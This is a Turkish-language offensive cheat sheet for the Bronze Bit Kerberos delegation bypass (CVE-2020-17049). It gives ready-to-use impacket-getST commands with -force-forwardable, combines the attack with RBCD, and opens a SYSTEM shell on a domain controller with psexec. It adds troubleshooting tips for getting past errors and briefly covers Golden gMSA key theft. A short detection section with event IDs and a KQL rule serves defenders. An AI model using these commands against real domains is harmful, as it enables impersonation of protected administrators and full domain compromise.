## 1. Genel Bakış ve Kriptografik Kusur

Kerberos Kısıtlı Yetki Devri (Constrained Delegation ve RBCD) mimarilerinde savunmanın en son kalkanı; kritik kullanıcıların (Domain Admins vb.) **"Account is sensitive and cannot be delegated" (`USER_NOT_DELEGATED - 0x100000`)** bayrağı ile işaretlenmesi veya **Protected Users (RID 525)** grubuna dahil edilmesidir. Normal şartlarda KDC, bu hesaplar adına talep edilen S4U2Self servis biletlerinde **`forwardable (0x40000000)`** bayrağını sıfırlar (`forwardable=0`). İletilemez bir biletle S4U2Proxy işletilemeyeceğinden saldırganın zinciri kırılır.

**Bronze Bit (CVE-2020-17049)**, Kerberos KDC uygulamasındaki kritik bir kriptografik doğrulama zaafıdır:
- S4U2Self adımıyla üretilen Service Ticket, **delegasyonu yürüten servis hesabının kendi anahtarıyla** şifrelenir.
- Saldırgan servis hesabının parolasını/hash'ini kontrol ettiğinden, gelen bileti yerel olarak deşifre edebilir.
- Yama öncesi KDC, S4U2Proxy aşamasında kendisine sunulan biletin `forwardable` bayrağının kriptografik bütünlüğünü (PAC imzasını) yeterince denetlemiyordu.
- Saldırgan bilet içerisindeki `forwardable` bayrağını ikili düzeyde `0`'dan `1`'e çevirip bileti kendi anahtarıyla yeniden şifreleyerek KDC'ye sunar; KDC hileli bileti meşru kabul ederek yetkili servis biletini teslim eder.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 BRONZE BIT (CVE-2020-17049) SÖMÜRÜ MİMARİSİ                 │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
           [1. Korunan Hesap Adına S4U2Self Talebi]
           - svc-web hesabı, "Protected-Admin" adına S4U2Self başlatır
           - KDC: "Protected-Admin delege edilemez" ──▶ forwardable=0 bilet döner
           - Dönen bilet svc-web'in NT/AES anahtarıyla şifrelidir
                                      │
                                      ▼
           [2. Yerel Bilet Deşifreleme ve Bayrak Manipülasyonu]
           - Saldırgan elindeki svc-web anahtarıyla biletin şifresini çözer
           - Bilet başlığındaki Kerberos Flags alanında forwardable biti 1 yapılır
           - Bilet tekrar svc-web anahtarıyla şifrelenir (Bronze Bit müdahalesi)
                                      │
                                      ▼
           [3. Hileli Bilet ile S4U2Proxy Çağrısı]
           - Saldırgan sahte forwardable bilet ile KDC'ye S4U2Proxy isteği gönderir
           - Yamasız KDC bayrağın manipüle edildiğini fark etmez ve ONAYLAR
                                      │
                                      ▼
           [4. Korunan Hesabın Kimliğinde Hedef Sistemde Kod Yürütme]
           - CIFS/DC01 için üretilen Service Ticket ile Domain Controller'a erişilir
           - "Delege edilemez" kuralı tamamen atlatılarak domain ele geçirilir
```

### 1.1 Bronze Bit Tarafından Açılan İki Kritik Saldırı Vektörü

| Senaryo Türü | Ön Koşul ve Yapılandırma | Normal KDC Davranışı | Bronze Bit İle Sağlanan Etki |
|---|---|---|---|
| **Senaryo A: Kerberos Only Baypass** | Hesaba constrained delegation verilmiş ancak `Protocol Transition` kapalı (Kerberos Only). | S4U2Self bileti `forwardable=0` olarak döner; keyfi kullanıcı taklit edilemez. | Forwardable biti 1 yapılarak Kerberos Only kısıtı tamamen aşılır ve Protocol Transition varmış gibi sömürülür. |
| **Senaryo B: Sensitive / Protected Users Baypass** | Hedef kullanıcı `Account is sensitive` işaretli veya `Protected Users` grubunda. | KDC forwardable bilet vermeyi reddeder; S4U2Proxy başarısız olur. | Bilet bayrağı zorla set edilerek (`-force-forwardable`) Domain Admin gibi en korunan hesaplar dahi taklit edilir. |

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 Paket Düzeyinde Kerberos Flags Manipülasyonu
RFC 4120 uyarınca Kerberos biletleri ASN.1 yapısında bir `EncTicketPart` taşır. Bu bloğun içinde `flags` alanı 32-bit bir bit dizisidir:
```
KerberosFlags ::= BIT STRING {
    reserved(0),
    forwardable(1),      <--- 0x40000000 (Bronze Bit tarafından 1 yapılan bit)
    forwarded(2),
    proxiable(3),
    proxy(4),
    may-postdate(5),
    postdated(6),
    invalid(7),
    renewable(8),
    initial(9),
    pre-authent(10),
    hw-authent(11)
}
```
Yama öncesi Microsoft KDC, S4U2Proxy sırasında sunulan servis biletinin içindeki PAC imzasını KDC anahtarıyla kontrol etse de, bilet başlığındaki `forwardable` bayrağının servis anahtarıyla değiştirilip değiştirilmediğini çapraz doğrulamıyordu.

### 2.2 Golden gMSA ve dMSA İstismarı (KDS Kök Anahtarı Çalınması)
Group Managed Service Accounts (gMSA) ve modern Delegated Managed Service Accounts (dMSA), 120 karakterlik dinamik parolalara sahiptir ve doğrudan kırılamaz:
- Ancak Active Directory'de Key Distribution Services (KDS) kök anahtarı (`CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration...`) okunabilirse;
- Saldırgan **Golden gMSA** tekniğiyle etki alanındaki tüm gMSA hesaplarının anlık NT hash'lerini matematiksel olarak türetebilir.
- Bu gMSA hesapları genellikle kurumsal sistemlerde kısıtlı delegasyonla yetkilendirildiğinden, elde edilen hash doğrudan Bronze Bit / S4U2Proxy zincirine beslenir.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Impacket getST ile Bronze Bit Kullanarak Korumalı Admin'i Taklit Etme
```bash
# 1. Normal S4U denemesi (Sensitive hesap için başarısız olur)
impacket-getST -spn CIFS/DC01.corp.local -impersonate "ProtectedAdmin" -hashes :28f98e0c5e63078b8474ba0c4d5d7476 corp.local/svc-web -dc-ip 10.10.10.5
# Çıktı: [-] Kerberos Session Error: KDC_ERR_BADOPTION(Ticket not forwardable)

# 2. Bronze Bit (-force-forwardable) bayrağı ile kısıtı delme
impacket-getST -spn CIFS/DC01.corp.local -impersonate "ProtectedAdmin" -force-forwardable -hashes :28f98e0c5e63078b8474ba0c4d5d7476 corp.local/svc-web -dc-ip 10.10.10.5

# 3. Başarılı bilet ile DC üzerinde SYSTEM yetkisinde komut yürütme
export KRB5CCNAME=ProtectedAdmin@CIFS_DC01.corp.local.ccache
impacket-psexec -k -no-pass corp.local/ProtectedAdmin@DC01.corp.local
```

### Senaryo 2: RBCD ve Bronze Bit Birleşimi (Sensitive Hesaba Karşı)
```bash
# RBCD ile oluşturulmuş FAKE01$ makinesi üzerinden "cannot be delegated" işaretli hesabı taklit etme
impacket-getST -spn CIFS/TARGET01.corp.local -impersonate "tier0-admin" -force-forwardable corp.local/'FAKE01$':'Winter2026!Pass' -dc-ip 10.10.10.5
```

### Senaryo 3: Hedef DC Yama Seviyesi Denetimi (OS Build Tespiti)
```bash
# NetExec ile DC build sürümünü sorgulama (Kasım 2020 yaması KB4586786 öncesi yapılar)
nxc smb 10.10.10.5 -u jdoe -p 'Welcome123!'
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `KDC_ERR_BADOPTION (Ticket not forwardable)` | Domain Controller CVE-2020-17049 (KB4586786) için yamalanmış; manipüle edilen bit KDC tarafından reddedildi. | DC yamalıdır; teknik bu DC'de uygulanamaz. Korumasız standart bir admin hesabını taklit edin veya AD CS zafiyetlerine yönelin. |
| `KRB_AP_ERR_MODIFIED (Checksum error)` | Bilet manipülasyonu sırasında servis anahtarı yanlış girildi; bilet bozuldu. | Servis hesabının doğru NT hash veya AES anahtarını sağladığınızdan emin olun (`-hashes` veya `-aesKey`). |
| `KDC_ERR_POLICY (Protected Users RC4 kısıtı)` | Protected Users üyesi hesaplar RC4 şifrelemeyi reddeder; istek RC4 ile yapıldı. | Komuta `-aesKey <AES256_KEY>` bayrağını ekleyerek AES-256 şifreleme ile bilet talep edin. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef SPN etki alanında tanımlı değil veya DNS adı çözülemiyor. | SPN'i tam FQDN ile belirtin (`CIFS/DC01.corp.local`). |
| `KRB_AP_ERR_SKEW (Clock skew too great)` | Saldırgan sistemi ile KDC arasındaki saat farkı 5 dakikayı aşıyor. | Saati senkronize edin: `rdate -n 10.10.10.5`. |
| `STATUS_ACCESS_DENIED on PsExec` | Bilet geçerli ancak hedefte UAC Remote kısıtlamaları veya yerel güvenlik duvarı aktif. | WinRM veya WMI portları üzerinden bağlanmayı deneyin (`evil-winrm -r corp.local`). |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 4769 (Kerberos Service Ticket Talebi):** Bronze Bit sömürüsünde ağ trafiğinde sıra dışı bir durum görünmez; ancak **semantik imkânsızlık** tespit edilir:
  - `TargetUserName` alanında "Account is sensitive and cannot be delegated" işaretli veya `Protected Users` grubunda olan bir hesabın adı yer alırken,
  - `Transited Services` alanı dolu bir S4U2Proxy bilet talebinin başarıyla sonuçlanması (Status: `0x0`).
- **KB4586786 Yaması Sonrası Olay Günlükleri:**
  - **Event ID 37 (System Log - KDC):** Manipüle edilmiş veya geçersiz PAC imzası taşıyan bilet reddedildiğinde üretilen güvenlik uyarısı.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: Delege Edilemez Hesapların Transited Services İle Bilet Alması (Bronze Bit İmzası)
SecurityEvent
| where EventID == 4769 and Status == "0x0"
| where isnotempty(TransitedServices)
| where TargetUserName in~ ("Administrator", "krbtgt", "da-admin") // veya Protected Users listesi
| project TimeGenerated, Computer, TargetUserName, ServiceName, TicketOptions, TransitedServices, IpAddress
```

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: impacket-getST ile Bronze Bit İstismarı (-force-forwardable)
```bash
impacket-getST -spn CIFS/DC01.corp.local -impersonate Administrator -force-forwardable -hashes :<NTHASH> corp.local/svc-web -dc-ip 10.10.10.5
```
- **Ne Yapar?** S4U2Self biletindeki `forwardable` bitini yerel olarak 1 yaparak delege edilemez kullanıcıların taklit edilmesini sağlar.
- **Ne Zaman Kullanılır?** Hedef yönetici hesabı "sensitive" işaretli olduğunda veya Kerberos-Only kısıtını delmek için.
- **Parametreler:** `-force-forwardable`: CVE-2020-17049 sömürü bayrağı; `-impersonate`: Taklit edilecek hassas hesap.

### Komut 2: AES-256 Anahtarı ile Bronze Bit (Protected Users Bypass)
```bash
impacket-getST -spn CIFS/DC01.corp.local -impersonate "ProtectedAdmin" -force-forwardable -aesKey <AES256_KEY> corp.local/svc-web -dc-ip 10.10.10.5
```
- **Ne Yapar?** Protected Users grubu RC4 kabul etmediğinden isteği AES-256 şifreleme ile paketleyerek Bronze Bit uygular.
- **Ne Zaman Kullanılır?** Hedef kullanıcı Protected Users grubuna üye olduğunda RC4 hata almamak için.
- **Parametreler:** `-aesKey`: Servis hesabının AES-256 Kerberos anahtarı.

### Komut 3: RBCD ile Birleşik Bronze Bit Sömürüsü
```bash
impacket-getST -spn CIFS/SRV01.corp.local -impersonate "corp-admin" -force-forwardable corp.local/'EVILPC$':'Password123!' -dc-ip 10.10.10.5
```
- **Ne Yapar?** RBCD ile yetkilendirilen sahte bilgisayar hesabı üzerinden hassas bir yöneticiyi hedef sunucuda taklit eder.
- **Ne Zaman Kullanılır?** Makineye yazma izni varken yöneticinin korumalı hesap olması durumunda.
- **Parametreler:** `corp.local/'EVILPC$'`: Kontrol edilen makine hesabı.

### Komut 4: Türetilen Bilet ile Domain Controller'a PsExec Bağlantısı
```bash
export KRB5CCNAME=Administrator@CIFS_DC01.corp.local.ccache && impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```
- **Ne Yapar?** Bronze Bit ile üretilen servis biletini kullanarak DC'de doğrudan SYSTEM shell açar.
- **Ne Zaman Kullanılır?** Bilet başarıyla alındıktan sonra operasyonel hedefi tamamlamak için.
- **Parametreler:** `-k`: Kerberos kimlik doğrulaması; `-no-pass`: Şifre sormaz.

### Komut 5: Hesabın "Cannot be Delegated" Durumunu Sorgulama (PowerView)
```powershell
Get-DomainUser -Identity Administrator -Properties useraccountcontrol | ? { $_.useraccountcontrol -band 0x100000 }
```
- **Ne Yapar?** Hedef hesabın `USER_NOT_DELEGATED (0x100000)` bayrağına sahip olup olmadığını denetler.
- **Ne Zaman Kullanılır?** Bronze Bit yönteminin gerekip gerekmediğini anlamak için keşif aşamasında.
- **Parametreler:** `-band 0x100000`: İlgili UAC koruma bitini maskeler.

### Komut 6: DC Yama Seviyesi ve SMB Build Sürümü Sorgulama
```bash
nxc smb 10.10.10.5 -u jdoe -p 'Welcome123!'
```
- **Ne Yapar?** Hedef Domain Controller'ın tam işletim sistemi yapısını (build number) dökümler.
- **Ne Zaman Kullanılır?** Sistemin Kasım 2020 öncesi (yamasız) olup olmadığını önceden tahmin etmek için.
- **Parametreler:** `smb`: SMB protokolü üzerinden başlık bilgilerini okur.
